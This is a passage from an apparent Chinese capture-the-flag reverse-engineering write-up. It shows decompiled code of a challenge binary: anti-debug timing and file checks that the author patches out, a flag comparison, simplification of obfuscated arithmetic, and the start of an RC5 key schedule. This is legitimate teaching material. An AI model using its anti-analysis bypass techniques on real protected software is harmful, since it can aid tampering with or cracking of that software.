</span></span><span class=line><span class=cl>  <span class=nf>xor_dec</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v7</span><span class=p>,</span> <span class=mi>18LL</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>needle</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stream</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>modes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>stream</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=nf>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stream</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>!</span><span class=nf>__isoc99_sscanf</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v12</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v3</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=nf>strstr</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>needle</span><span class=p>))</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ol><li>getpid</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=nf>sub_8030</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=n>__rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=n>v0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>getpid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=n>__rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>v1</span> <span class=o>-</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>result</span> <span class=o>&gt;</span> <span class=mh>0x186A0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>_exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>一个个force jmp或者nop后patch即可动调</p><p>比较函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>sub_6180</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#34;+&#34; TO EXPAND]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>format</span> <span class=o>=</span> <span class=mh>0x61C477DB26D672BDLL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=mh>0x41BD3F9C2FD86CACLL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=mi>1102520059</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>xor_dec</span><span class=p>(</span><span class=n>format</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v9</span><span class=p>,</span> <span class=mi>16LL</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>unk_9031</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>dest</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=mi>1350490027</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>xor_dec</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v7</span><span class=p>,</span> <span class=mi>38LL</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memcpy</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>cmp</span><span class=p>,</span> <span class=mh>0x21uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=mi>1189641421</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>xor_dec</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v5</span><span class=p>,</span> <span class=mi>33LL</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>memcpy</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=mh>0x21uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=o>*</span><span class=p>)(</span><span class=n>v4</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>v3</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>printf</span><span class=p>(</span><span class=n>format</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>printf</span><span class=p>(</span><span class=n>dest</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>以及两个混淆比较厉害的加密函数（分析可知是rc5加密），可以借助ida9自带的goomba插件解除部分混淆，右键</p><p>De-obfuscate即可，但是得到的函数依然存在很多逻辑混淆</p><p>比如恒真恒假跳转</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>unk_B1C8</span> <span class=o>&lt;</span> <span class=mi>10</span> <span class=o>&amp;&amp;</span> <span class=n>unk_B1C8</span> <span class=o>&gt;=</span> <span class=mi>10</span> <span class=p>)</span>    <span class=o>//</span> <span class=n>恒假</span>
</span></span><span class=line><span class=cl>    <span class=n>goto</span> <span class=n>LABEL_26</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>unk_B218</span> <span class=o>&gt;=</span> <span class=mi>10</span> <span class=o>||</span> <span class=n>unk_B218</span> <span class=o>&lt;</span> <span class=mi>10</span> <span class=p>)</span>    <span class=o>//</span> <span class=n>恒真</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>减1</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=o>*</span><span class=n>v37</span> <span class=o>-</span> <span class=mi>1067854539</span> <span class=o>+</span> <span class=mi>1067854538</span>    <span class=o>//</span> <span class=n>等价于</span><span class=o>*</span><span class=n>v37</span> <span class=o>-</span> <span class=mi>1</span>
</span></span></code></pre></td></tr></table></div></div><p>异或</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=o>*</span><span class=n>v24</span> <span class=o>&amp;</span> <span class=mh>0xAE4094B7</span> <span class=o>|</span> <span class=o>~*</span><span class=n>v24</span> <span class=o>&amp;</span> <span class=mh>0x51BF6B48</span>    <span class=o>//</span> <span class=n>等价于</span><span class=o>*</span><span class=n>v24</span><span class=o>^</span><span class=mh>0x51BF6B48</span>
</span></span></code></pre></td></tr></table></div></div><p>偶数次异或相同值不变</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=p>(</span><span class=o>*</span><span class=n>v24</span> <span class=o>&amp;</span> <span class=mh>0xAE4094B7</span> <span class=o>|</span> <span class=o>~*</span><span class=n>v24</span> <span class=o>&amp;</span> <span class=mh>0x51BF6B48</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=o>*</span><span class=n>v23</span> <span class=o>&amp;</span> <span class=mh>0xAE4094B7</span> <span class=o>|</span> <span class=o>~*</span><span class=n>v23</span> <span class=o>&amp;</span> <span class=mh>0x51BF6B48</span><span class=p>)</span>    <span class=o>//</span> <span class=n>等价于</span><span class=o>*</span><span class=n>v24</span><span class=o>^*</span><span class=n>v23</span>
</span></span></code></pre></td></tr></table></div></div><p>或</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>v9</span> <span class=o>^</span> <span class=n>v8</span> <span class=o>|</span> <span class=n>v9</span> <span class=o>&amp;</span> <span class=n>v8</span>    <span class=c1>// 等价于v9|v8
</span></span></span></code></pre></td></tr></table></div></div><p>最后可以得到两份干净简洁的伪代码交给gemini分析下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_555555555250</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#34;+&#34; TO EXPAND]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v41</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v42</span> <span class=o>=</span> <span class=n>a2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v2</span> <span class=o>=</span> <span class=n>HIDWORD</span><span class=p>(</span><span class=n>v42</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>v32</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v33</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v34</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v35</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v36</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v37</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v38</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v39</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v40</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v27</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span> <span class=o>=</span> <span class=n>v41</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>HIDWORD</span><span class=p>(</span><span class=n>v27</span><span class=p>)</span> <span class=o>=</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>LODWORD</span><span class=p>(</span><span class=n>v27</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nl>LABEL_3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>v31</span> <span class=o>=</span> <span class=o>*</span><span class=n>v37</span> <span class=o>&lt;</span> <span class=mi>4u</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v31</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>v38</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>v34</span> <span class=o>+</span> <span class=o>*</span><span class=n>v37</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>v3</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=n>v38</span> <span class=o>&gt;=</span> <span class=mi>4u</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>++*</span><span class=n>v37</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>LABEL_3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=p>(</span><span class=n>v34</span> <span class=o>+</span> <span class=o>*</span><span class=n>v37</span><span class=p>)</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v33</span> <span class=o>+</span> <span class=p>(</span><span class=o>*</span><span class=n>v38</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=o>*</span><span class=n>v37</span><span class=p>))</span> <span class=o>+</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>v34</span> <span class=o>+</span> <span class=o>*</span><span class=n>v37</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=o>++*</span><span class=n>v38</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=n>v37</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>**</span><span class=n>v32</span> <span class=o>=</span> <span class=mh>0xB7E15163</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v4</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=n>v37</span> <span class=o>&gt;=</span> <span class=mh>0x1Au</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v32</span> <span class=o>+</span> <span class=mi>4LL</span> <span class=o>*</span> <span class=o>*</span><span class=n>v37</span><span class=p>)</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v32</span> <span class=o>+</span> <span class=mi>4LL</span> <span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>v37</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x61C88647</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>++*</span><span class=n>v37</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=n>v35</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v8</span> <span class=o>=</span> <span class=n>v36</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=n>v37</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v38</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v9</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v8</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v7</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v39</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=n>v39</span> <span class=o>&lt;</span> <span class=mi>78</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v10</span> <span class=o>=</span> <span class=n>v38</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v11</span> <span class=o>=</span> <span class=n>v36</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v12</span> <span class=o>=</span> <span class=n>v34</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v13</span> <span class=o>=</span> <span class=n>v35</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v15</span> <span class=o>=</span> <span class=p>((</span><span class=o>*</span><span class=n>v35</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v32</span> <span class=o>+</span> <span class=mi>4LL</span> <span class=o>*</span> <span class=o>*</span><span class=n>v37</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=n>v36</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>29</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=o>*</span><span class=n>v35</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v32</span> <span class=o>+</span> <span class=mi>4LL</span> <span class=o>*</span> <span class=o>*</span><span class=n>v37</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=n>v36</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v32</span> <span class=o>+</span> <span class=mi>4LL</span> <span class=o>*</span> <span class=o>*</span><span class=n>v37</span><span class=p>)</span> <span class=o>=</span> <span class=n>v15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v13</span> <span class=o>=</span> <span class=n>v15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v18</span> <span class=o>=</span> <span class=n>v37</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v19</span> <span class=o>=</span> <span class=p>((</span><span class=o>*</span><span class=n>v11</span> <span class=o>+</span> <span class=o>*</span><span class=n>v35</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>v12</span> <span class=o>+</span> <span class=o>*</span><span class=n>v10</span><span class=p>))</span> <span class=o>&gt;&gt;</span> <span class=p>((</span><span class=o>*</span><span class=n>v11</span> <span class=o>+</span> <span class=o>*</span><span class=n>v35</span><span class=p>)</span> <span class=o>+</span> <span class=mi>32</span><span class=p>))</span> <span class=o>|</span> <span class=p>((</span><span class=o>*</span><span class=n>v13</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>v12</span> <span class=o>+</span> <span class=o>*</span><span class=n>v10</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=n>v11</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=o>*</span><span class=n>v13</span> <span class=o>+</span> <span class=o>*</span><span class=n>v11</span><span class=p>));</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=p>(</span><span class=n>v12</span> <span class=o>+</span> <span class=o>*</span><span class=n>v10</span><span class=p>)</span> <span class=o>=</span> <span class=n>v19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v11</span> <span class=o>=</span> <span class=n>v19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v20</span> <span class=o>=</span> <span class=n>v38</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v18</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>v18</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mh>0x1A</span><span class=p>;</span>
